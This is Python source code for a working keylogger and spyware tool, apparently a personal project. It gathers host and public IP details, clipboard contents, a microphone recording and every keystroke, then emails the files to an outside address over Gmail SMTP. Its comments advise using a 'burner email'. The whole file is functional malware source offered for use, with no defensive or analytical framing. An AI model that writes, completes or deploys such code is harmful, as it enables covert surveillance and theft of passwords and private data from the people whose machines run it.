# Libraries
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

import datetime

import socket
import platform

import pyperclip

from pynput.keyboard import Key, Listener

import time
import os

from scipy.io.wavfile import write
import sounddevice as sd

from cryptography.fernet import Fernet

import getpass
from requests import get

from multiprocessing import Process, freeze_support
from PIL import ImageGrab

log_filename = f"keylog_{datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.txt"
system_information = "system_info.txt"
clipboard_information = "clipboard.txt"
microphone_time = 10  #seconds to record microphone audio
audio_information = "audio.wav"

#add email and password for sending email (will need 2FA Enabled and app password generated (16 digit code)))
#email_address = add your burner email here
#password = add your app password here

#toaddr = add the email you want to send the logs to here


screenshot_information = "screenshot.png"
encryption_key = "encryption.key"

file_path = f"/Users/{getpass.getuser()}/Desktop/Key Stroke Identifer Project/"
extend = "/"

#email sending function
def send_email(filenames, attachments, toaddr):
    try:
        fromaddr = email_address
        
        msg = MIMEMultipart()
        msg["From"] = fromaddr
        msg["To"] = toaddr
        msg["Subject"] = "Keylogger Project Files"
        
        body = "Attached are the system info and keystroke info files"
        msg.attach(MIMEText(body, "plain"))
        
        # Attach each file
        for filename, attachment_path in zip(filenames, attachments):
            attachment_file = open(attachment_path, 'rb')
            
            p = MIMEBase('application', 'octet-stream')
            p.set_payload(attachment_file.read())
            encoders.encode_base64(p)
            p.add_header('Content-Disposition', f"attachment; filename= {filename}")
            
            msg.attach(p)
            attachment_file.close()
        
        s = smtplib.SMTP('smtp.gmail.com', 587)
        s.starttls()
        s.login(fromaddr, password)
        
        text = msg.as_string()
        s.sendmail(fromaddr, toaddr, text)
        s.quit()
        
        print("Email sent successfully with all attachments!")
        
    except Exception as e:
        print(f"Failed to send email: {e}")

#for getting system information
def computer_information():
    with open(file_path + extend + system_information, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip + "\n")
        
        except Exception:
            f.write("Could not get Public IP Address (most likely is offline)\n")

        f.write("Processor: " + (platform.processor()) + "\n")
        f.write("System: " + platform.system() + " " + platform.version() + "\n")
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write("Private IP Address: " + IPAddr + "\n")

computer_information()

#for getting clipboard data
def copy_clipboard():
    with open(file_path + extend + clipboard_information, "a") as f:
        try:
            clipboard = pyperclip.paste()
            f.write("Clipboard Data: \n" + clipboard)
        except Exception:
            f.write("Could not copy clipboard data")

copy_clipboard()

#for getting audio information
def microphone():
    sample_frequency = 44100  # Sample rate
    seconds = microphone_time
    
    myRecording = sd.rec(int(seconds * sample_frequency), samplerate=sample_frequency, channels=1)
    sd.wait()  # Wait until recording is finished
    write(file_path + extend + audio_information, sample_frequency, myRecording)

microphone()

count = 0
keys = []

def key_on_press(key):
    global keys, count
    
    print(key)
    keys.append(key)
    count = count + 1
    
    if count >= 1:
        count = 0
        write_file(keys)
        keys = []
    
    
def write_file(keys):
    with open(file_path + extend + log_filename, "a") as f: # a is append to log file
        for key in keys:
            k = str(key).replace("'", "") # prevent single quotes from naturually logged
            if k.find("space") > 0:  # Add a space for space key
                f.write(' ')
            if k.find("enter") > 0: # Adds new line for enter key
                f.write('\n')
                f.close()
            elif k.find("Key") == -1: # Print all other keys normally
                f.write(k)
                f.close()



#escape key exits the keylogger
def key_on_release(key):
    if key == Key.esc:
        return False
 
    
with Listener(on_press=key_on_press, on_release=key_on_release) as listener:
    listener.join()


# Send email with keylog info, system info, clipboard info
filenames = [log_filename, system_information, clipboard_information, audio_information]
attachments = [
    file_path + extend + log_filename,
    file_path + extend + system_information,
    file_path + extend + clipboard_information,
    file_path + extend + audio_information
]   
send_email(filenames, attachments, toaddr)
